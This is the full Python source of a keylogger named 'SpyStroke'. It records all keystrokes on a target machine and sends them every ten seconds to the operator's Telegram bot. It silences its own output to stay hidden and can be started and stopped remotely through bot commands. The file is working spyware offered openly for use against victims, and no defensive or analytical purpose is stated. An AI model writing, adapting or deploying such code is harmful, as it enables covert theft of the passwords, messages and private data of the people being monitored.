import os
import pynput.keyboard as keyboard
import threading
import asyncio
import requests
import logging
import sys
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.error import NetworkError


logging.basicConfig(level=logging.CRITICAL)

# Variables for keylogging and Telegram bot
log = "Thanks for using SpyStroke! Target keystrokes will be coming."
bot_token = "Your_Telegram_bot_Token"  # Replace with your Telegram bot token
chat_id = "YOUR_Telegram_chat_ID"  # Replace with your Telegram chat ID | USE https://t.me/chatIDrobot
interval = 10  # Time interval in seconds to send logs


sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def on_press(key):
    global log
    try:
        log += key.char  
    except AttributeError:
        
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            log += "[CTRL] "
        else:
            log += f"[{key.name.upper()}] "  


async def send_keystrokes():
    global log
    while True:
        if log.strip():  
            await silent_send_to_telegram(log)
            log = ""  
        await asyncio.sleep(interval)


async def silent_send_to_telegram(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except requests.exceptions.RequestException:
        pass  


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        '''The target has been hacked!

/key_logger - Start the keylogger
/exit - Stop the keylogger


Follow me: https://x.com/anishalx7
GitHub: https://github.com/anishalx
'''
    )

async def exit_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Stopping the keylogger...')
    os._exit(0)  # Clean exit

async def key_logger(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Keylogger started!')
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  
    asyncio.create_task(send_keystrokes())  


def main():
    while True:  
        try:
            app = ApplicationBuilder().token(bot_token).build()
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("exit", exit_bot))
            app.add_handler(CommandHandler("key_logger", key_logger))

            print("Bot is running...")  
            app.run_polling()
        except NetworkError:
            print("Network error. Retrying...")
            continue  


if __name__ == "__main__":
    main()
